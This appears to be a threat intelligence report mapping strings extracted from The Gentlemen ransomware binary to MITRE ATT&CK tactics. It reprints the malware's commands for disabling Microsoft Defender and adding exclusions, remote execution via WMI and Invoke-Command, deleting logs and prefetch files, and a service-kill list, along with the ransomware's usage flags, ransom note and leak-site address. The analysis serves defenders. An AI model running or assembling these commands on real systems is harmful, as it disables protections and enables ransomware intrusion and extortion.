---
title: "Threats Intelligence: The Gentlemen Ransomware"
date: 2026-02-20 18:00:00 +0200
categories:
  - Threats Intelligences
tags:
  - threat-intelligence
  - ransomware
  - mitre-attack
  - malware-analysis
summary: "Technical threat intelligence report mapping hapvida.exe activity to MITRE ATT&CK tactics."
description: "Detailed breakdown of The Gentlemen ransomware operational commands and references extracted from hapvida.exe."
image:
  path: /assets/img/the-gentlemen-ransomware/gentlemen-cover.webp
  alt: The Gentlemen Ransomware
---
# hapvida.exe — Extracted Commands & References by MITRE ATT&CK Tactic

**File:** `hapvida.exe` | **Language:** Go | **Tool:** FLOSS v3.1.1  
**Threat Group:** The Gentlemen Ransomware

---

## 1. Initial Access

### Techniques Observed
- Exploitation of internet-facing services
- Abuse of compromised **FortiGate** administrative accounts

### C2 & Contact References (extracted from binary)
| Type | Value |
|------|-------|
| Email | `negotiation_hapvida@proton.me` |
| TOX ID | `88984846080D639C9A4EC394E53BA616D550B2B3AD691942EA2CCD33AA5B9340FD1A8FF40E9A` |
| TOX Download | `https://tox.chat/download.html` |
| Leak Site (Tor) | `http://tezwsse5czllksjb7cwp65rvnk4oobmzti2znn42i43bjdfd2prqqkad.onion/` |
| Tor Browser | `https://www.torproject.org/download/` |

---

## 2. Reconnaissance & Discovery

### Techniques Observed
- Network scanning with **Advanced IP Scanner** and **Nmap**
- Enumeration scripts to identify domain user accounts

### Enable Network Discovery (extracted from binary)
```powershell
Get-NetFirewallRule -DisplayGroup "Network Discovery" | Enable-NetFirewallRule
```

### Volume / Drive Enumeration (extracted from binary)
```powershell
$volumes = @()
$volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:\*' } | Select-Object -ExpandProperty Name
try {
    $volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
} catch {}
$volumes
```
> Enumerates all local drives and Windows Failover Cluster Shared Volumes (CSV) for encryption targeting.

### System Information Display (extracted from binary)
```powershell
Write-Host "Windows version <version>" -BackgroundColor Blue -ForegroundColor White
Write-Host "The Gentlemen" -BackgroundColor DarkGray -ForegroundColor White -NoNewline
```

### PowerShell Command History Path (extracted from binary)
```
AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
```
> May be read to harvest previously executed commands and credentials.

### Registry Keys Referenced (extracted from binary)
```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
```

---

## 3. Privilege Escalation

### Techniques Observed
- Execution of components with elevated privileges to gain full environment control

### Elevated Execution Indicators (extracted from binary)
```
/RU SYSTEM       (schtasks flag — run as SYSTEM)
--system         (ransomware flag — encrypt as SYSTEM user)
Win32_Process    (WMI process creation with elevated context)
```

### WMI Elevated Process Creation (extracted from binary)
```powershell
$p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
$p.Create("%s")
```

---

## 4. Defense Evasion

### Techniques Observed
- Deployment of kernel-level anti-AV utilities
- Disabling Microsoft Defender real-time protection
- Configuration of AV/Defender exclusions
- Neutralization of EDR tools
- Clearing telemetry and Windows event logs

### Disable Windows Defender — Local (extracted from binary)
```powershell
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true;
Add-MpPreference -ExclusionPath 'C:\';
Add-MpPreference -ExclusionPath 'C:\Temp';
Add-MpPreference -ExclusionPath '\<share$>';"
```

### Disable Windows Defender — Force (extracted from binary)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Force
```

### Disable Windows Defender — Remote via Invoke-Command (extracted from binary)
```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```

### Delete Windows Defender Support Logs (extracted from binary)
```cmd
del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*
```

### Delete RDP Log Files (extracted from binary)
```cmd
del /f /q %SystemRoot%\System32\LogFiles\RDP*\*.*
```

### Delete Windows Prefetch (extracted from binary)
```cmd
del /f /q C:\Windows\Prefetch\*.*
```

### Shadow Copy Deletion (extracted from binary)
```
vssadmin      (binary reference)
shadows       (binary reference)
--shadowcopy  (internal flag)
```

### Event Log Manipulation (extracted from binary)
```
wevtutil      (binary reference)
```

### Cynet EDR Bypass Marker (extracted from binary)
```
!CynetRansomProtection(DON'T DELETE)
```

### Firewall Manipulation (extracted from binary)
```
advfirewall         (binary reference)
netsh advfirewall   (implied)
```

---

## 5. Lateral Movement & Remote Execution

### Techniques Observed
- Use of legitimate admin tools (**PsExec**, **PowerRun**, **PuTTY**) to transfer and execute payloads across systems

### Remote Process Execution via WMI (extracted from binary)
```powershell
$p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
$p.Create("%s")
```

### Remote Process Execution via Invoke-Command (extracted from binary)
```powershell
Invoke-Command -ComputerName %s -ScriptBlock { Start-Process "%s" }
```

### Scheduled Task Creation (extracted from binary)
```
schtasks
/RU /SC /TN /TR /ST   (schtasks flags present in string blob)
```

### Malicious Service Registration (extracted from binary)
```
binPath="UpdateSvc"
sc   (service control reference)
```

---

## 6. Persistence & Propagation

### Techniques Observed
- **GPO manipulation** for domain-wide payload distribution
- Use of **NETLOGON / SYSVOL** shares to deploy password-protected payloads
- Abuse of **AnyDesk** as a persistent encrypted remote access channel

### GPO / Domain-Wide Persistence via Invoke-Command (extracted from binary)
```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```

### NETLOGON / UNC Share Delivery (extracted from binary)
```
\share$      (UNC share path reference)
--shares     (ransomware flag: encrypt UNC shares)
NETLOGON     (referenced in LanmanServer parameters context)
```

### Autorun Persistence (extracted from binary)
```
autorun.ini
autorun.inf
```

### Registry Run Key Reference (extracted from binary)
```
reg add / reg set   (present in internal string blob)
```

---

## 7. Group Policy Manipulation

### Enable Network Discovery via GPO Firewall Rule (extracted from binary)
```powershell
Get-NetFirewallRule -DisplayGroup "Network Discovery" | Enable-NetFirewallRule
```

### Domain-Wide Defender Disablement via GPO / Invoke-Command (extracted from binary)
```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```
> Executed against multiple domain machines as a GPO-equivalent mass AV policy override.

### Registry Policy Paths (extracted from binary)
```
SOFTWARE\Microsoft\Windows NT\CurrentVersion\TimeZones
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

---

## 8. Data Collection & Exfiltration

### Techniques Observed
- Staging of sensitive data prior to exfiltration
- Encrypted **SFTP exfiltration using WinSCP**

### Volume Enumeration for Staging (extracted from binary)
```powershell
$volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:\*' } | Select-Object -ExpandProperty Name
$volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
```

### Double-Extortion Claim — Ransom Note (extracted from binary)
```
We have exfiltrated all your confidential and business data (including NAS, clouds, etc).
If you do not contact us, it will be published on our leak site and distributed to
major hack forums and social networks.
```

### Leak Site (extracted from binary)
```
http://tezwsse5czllksjb7cwp65rvnk4oobmzti2znn42i43bjdfd2prqqkad.onion/
```

### File Extension Exclusion List — Skipped During Encryption (extracted from binary)
```
.exe .bat .drv .tmp .msp .prf .ms .ci .co .key .ocx .pdb .wp .xhl .pro .mod
.dll .ps1 .ic .sh .tab .in .cmd .ani .386 .cur .idx .sys .com .sh .sm .pas
.pl .cp .lad .vic .ms .su .sql .SAP .cvd .vss .Sql .Dir
```

---

## 9. Ransomware Deployment & Impact

### Techniques Observed
- Ransomware deployment via **NETLOGON** using domain admin credentials
- File encryption with **`.7mtzhh`** extension
- Ransom note dropped as **`README-GENTLEMEN.txt`**
- Termination of backup, database, and security services (Veeam, SQL, Oracle, SAP, Acronis)
- Deletion of shadow copies, logs, artifacts, and security event data

### Ransomware CLI Flags (extracted from binary)
```
Usage: %s --password PASS [--path DIR1,DIR2,...] [--T MIN] [--silent] [--full]
           [--system] [--shares] [--fast] [--superfast] [--ultrafast]

  --password PASS     Access password (required)
  --path DIRS         Comma-separated list of target directories/disks (optional)
  --T MIN             Delay before start, in minutes (optional)
  --silent            Silent mode: do NOT rename files after encryption (optional)

  Mode Flags:
  --system            Run as SYSTEM: encrypt only local drives
  --shares            Encrypt only mapped network drives and UNC shares
  --full              Two-phase: --system + --shares (Best practice)

  Speed Flags:
  --fast              9% of each file encrypted
  --superfast         3% of each file encrypted
  --ultrafast         1% of each file encrypted

  Example 1: --password QWERTY --path "C:\,D:\,\nas\share" --T 15 --silent
  Example 2: --password QWERTY --system --fast
  Example 3: --password QWERTY --shares --T 10
  Example 4: --password QWERTY --full --ultrafast
```

### Encryption Start Messages (extracted from binary)
```
[+] Encryption started. Going background...
[+] FULL Encryption started [2 min delay]. Going background...
[+] SYSTEM Encryption started [2 min delay]. Going background...
```

### Ransom Note Content (extracted from binary)
```
Gentlemen, your network is under our full control.
All your files are now encrypted and inaccessible.

1. Any modification of encrypted files will make recovery impossible.
2. Only our unique decryption key and software can restore your files.
   Brute-force, RAM dumps, third-party recovery tools are useless.
3. Law enforcement, authorities, and data recovery companies will NOT help you.
4. Any attempt to restore systems, or refusal to negotiate, may lead to
   irreversible wipe of all data and your network.
5. We have exfiltrated all your confidential and business data (including NAS, clouds, etc).
   If you do not contact us, it will be published on our leak site.
```

### Services Terminated Before Encryption (extracted from binary)
```
sql, vss, VSS, VSNAP, QBDBMgrN, pgAdmin3, pgAdmin4, Veeam, MSSQLServer,
WSBExchange, GxVss, SAP, MySQL, MariaDB, PostgreSQL, TeamViewer,
BackupExecAgent, BackupExecRPCService, BackupExecManagementService,
BackupExecJobEngine, VeeamTransportSvc, OracleServiceORCL, MSExchange,
SAPService, postmaster, CagService, DefWatch, SccEvtMgr, GxClMgr, CVMountd
```
> Covers Veeam, SQL Server, Oracle, SAP, Acronis-family, and all major AV/EDR services.

### Victim ID (extracted from binary)
```
ead0d7a8ae0a6ffb7f0a5873fec4ff5e = YOUR ID
```

### Crypto Engine (extracted from binary)
```
crypto/aes       — AES encryption
crypto/rand      — Random key generation
chacha20         — ChaCha20 stream cipher
X25519           — Key exchange
AES-CBC / AES-NI — Hardware-accelerated AES
```

---

## Summary Table

| Tactic | Techniques | Key Commands / Artifacts |
|--------|-----------|--------------------------|
| **Initial Access** | Exploit public-facing app; Valid accounts | FortiGate account abuse; TOX/email C2; .onion leak site |
| **Reconnaissance & Discovery** | Network scan; Account discovery | Advanced IP Scanner, Nmap; `Get-WmiObject Win32_Volume`; `Get-NetFirewallRule`; PSReadline history |
| **Privilege Escalation** | Exploitation for privilege escalation | WMI `Win32_Process.Create()`; schtasks `/RU SYSTEM`; `--system` flag |
| **Defense Evasion** | Disable AV; Clear logs; Indicator removal | `Set-MpPreference`; `Add-MpPreference`; `del /f /q`; `vssadmin`; `wevtutil`; Cynet EDR bypass |
| **Lateral Movement** | Remote services; Admin tools | `Invoke-Command`; WMI; PsExec / PowerRun / PuTTY |
| **Persistence & Propagation** | GPO; Scheduled tasks; Remote access tools | NETLOGON/SYSVOL; AnyDesk; schtasks; `binPath=UpdateSvc` |
| **Group Policy Manipulation** | GPO modification | Network Discovery enable; Remote Defender disable domain-wide |
| **Collection & Exfiltration** | Data staged; SFTP exfil | `Win32_Volume` enum; WinSCP SFTP; double-extortion .onion site |
| **Impact** | Data encryption; Service stop | AES/ChaCha20; `.7mtzhh` ext; `--full/--system/--shares`; service kill list; `README-GENTLEMEN.txt` |

